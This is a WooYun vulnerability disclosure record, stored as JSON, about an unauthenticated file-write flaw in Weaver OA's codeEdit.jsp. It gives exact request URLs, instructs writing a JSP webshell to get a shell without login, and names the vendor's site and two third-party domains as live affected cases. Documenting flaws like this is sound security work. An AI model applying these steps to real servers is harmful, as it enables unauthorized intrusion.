{"id": 73149, "wybug_id": "wooyun-2015-0155705", "wybug_title": "泛微OA未授权可导致GetShell（简单粗暴，无需登录）", "wybug_corp": "泛微OA", "wybug_author": "浮萍", "wybug_date": "2015-11-25 10:19", "wybug_open_date": "2016-01-11 15:32", "wybug_type": "非授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-25：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2016-01-11：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述：  详细说明：  本来以为需要登录就一直没在意写代码无意发现不登录也行看如下链接无需登录http://localhost:8088/sysinterface/codeEdit.jsp?filename=******5308.java&filetype=javafilename为文件名称  为空时会自动创建一个\nString fileid = \"Ewv\";    String readonly = \"\";    boolean isCreate = false;    if(StringHelper.isEmpty(fileName)) {    \tDate ndate = new Date();    \tSimpleDateFormat sf = new SimpleDateFormat(\"yyyyMMddHHmmss\");    \tString datetime = sf.format(ndate);    \tfileid = fileid + datetime;    \tfileName= fileid + \".\" + filetype;    \tisCreate = true;    } else {        int pointIndex = fileName.indexOf(\".\");        if(pointIndex > -1) {            fileid = fileName.substring(0,pointIndex);        }            }\nfiletype为文件类型\n\n当filename文件存在时直接打开不存在时 会创建一个点击提交会保存当然也可以直接写入jsp文件访问如下链接http://localhost:8088/sysinterface/codeEdit.jsp?filename=ccccc.jsp&filetype=jsp\n\n将内容替换为jsp马\n\n提交即可\n\n\n\n访问http://localhost:8088/sysinterface/extpage/ccccc.jsp\n\n   漏洞证明：  官网http://pm.weaver.cn:9085/sysinterface/codeEdit.jsp?filename=ccccc.jsp&filetype=jsp\n\n但是访问出错查看文件确实写入\n\n但是官网好像做了限制，会提示磁盘不足例如\n\n附上两个案例http://mail.weifu.com.cn\n\nhttp://oa.ad-mart.cn\n\nfilename目录可以更改\n\n\n\n   修复方案：     版权声明：转载请注明来源 浮萍@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：15 (WooYun评价)  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 15, "Ranks": null}